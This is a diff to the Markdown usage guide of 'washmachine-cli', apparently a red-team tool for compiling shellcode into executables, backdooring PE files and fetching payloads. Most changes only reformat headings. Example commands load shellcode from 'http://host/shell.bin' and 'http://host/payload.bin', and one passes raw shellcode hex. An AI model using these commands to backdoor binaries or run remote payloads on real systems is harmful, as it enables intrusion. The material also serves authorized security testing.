@@ -4,7 +4,9 @@
 washmachine-cli <command> [options]
 ```
 
-## Commands
+This section is your command center for precise execution.
+
+## Command index
 
 | Command | Description |
 |---|---|
@@ -16,7 +18,7 @@ washmachine-cli <command> [options]
 | `provision` | Download/install required external tools (Bin2Shell) |
 | `test` | Run the automated test harness |
 
-## compile
+## `compile`
 
 Usage:
 
@@ -47,7 +49,7 @@ washmachine-cli compile --shellcode-hex FC4883E4F0... -e 1
 washmachine-cli compile -u http://host/shell.bin --verbose
 ```
 
-## analyze
+## `analyze`
 
 Usage:
 
@@ -55,7 +57,7 @@ Usage:
 washmachine-cli analyze <pe-file> [--json]
 ```
 
-## strip
+## `strip`
 
 Usage:
 
@@ -72,7 +74,7 @@ Options:
 - `--no-trim`
 - `--analyze`
 
-## backdoor
+## `backdoor`
 
 Usage:
 
@@ -98,7 +100,7 @@ Options:
 - `--verbose`
 - `--json`
 
-## list
+## `list`
 
 Usage:
 
@@ -113,7 +115,7 @@ Targets:
 - `--snippets`
 - `--compilers`
 
-## provision
+## `provision`
 
 Usage:
 
@@ -121,7 +123,7 @@ Usage:
 washmachine-cli provision
 ```
 
-## test
+## `test`
 
 Usage:
 
@@ -136,6 +138,10 @@ washmachine-cli test --shellcode messagebox.bin --phase all
 washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin
 washmachine-cli test --phase 3 --test-assets "testing assets\\binary\\shellcodes"
 ```
+
+::: tip Operator Tip
+For stable repeatability, pair `--json` output with session logs in `logging/session_*` to track pipeline behavior over time.
+:::
 
 ::: warning Security Notice
 For educational and authorized security testing purposes only.
